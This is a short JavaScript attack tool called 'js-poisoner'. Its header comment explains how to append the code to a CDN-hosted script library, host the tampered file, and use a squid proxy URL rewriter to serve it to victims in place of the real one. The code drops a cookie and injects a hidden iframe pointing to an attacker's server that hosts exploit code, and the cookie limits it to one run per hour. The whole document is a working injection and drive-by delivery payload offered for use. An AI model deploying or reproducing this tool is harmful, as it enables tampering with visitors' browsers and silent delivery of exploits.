/*

	js-poisoner 
			"Tampering with CDN's over the wire" 

	To modify the code below to suit your purposes just change the ip set in 
	the "setIframe" function below to were your web server hosting 
	exploit/rouge code resides.

        After selecting a web page you wish to inject this code into. analyze 
	it's source to locate a js script that is called from a 
	remote domain (a cdn for example). Download this file directly (curl/wget) 
	then paste the entire contents of this file adding to the js library/resource file.

	Place this modified script into /var/www/ and change it permissions to be 
	publicly avaliable
 
        Initiate poisoning by using the url rewrite program in squid proxy to mangle 
	the url to point to the poisoned js file.

	xor-function

*/

function createCookie(name, value) {

        var die = new Date();
        die.setTime(die.getTime()+(3600*1000));  // this is 1 hr in seconds
        var exp = "expires="+die.toUTCString();
        document.cookie = name+"="+value+"; "+exp+"; path=/";

};


function getCookie(name) {

	if (!name) { return null; }
	return(v = RegExp('(^|; )'+encodeURIComponent(name)+'=([^;]*)').exec(document.cookie))?v[2]:null;
};

function setIframe() {

        var ifm = document.createElement('iframe');
            ifm.style.display = "none";
            ifm.src='http://192.168.1.15/';   // change this line to your server address ( ip or domain )
            document.body.appendChild(ifm);

};


// Iframe will only execute if it has determined not to have been run previously via cookies
// thus preventing the code on the iframe from executing repeatedly every time this code loads 

if (getCookie("jspv001") === null )
{
        createCookie("jspv001", "true"); // cookie life is 1 hr to change this edit "date.getTime()" in the createCookie function 
        window.onload = setIframe();
  
}   // uncomment the line below if you wish to debug
   // else { alert(getCookie("jspv001")); } 

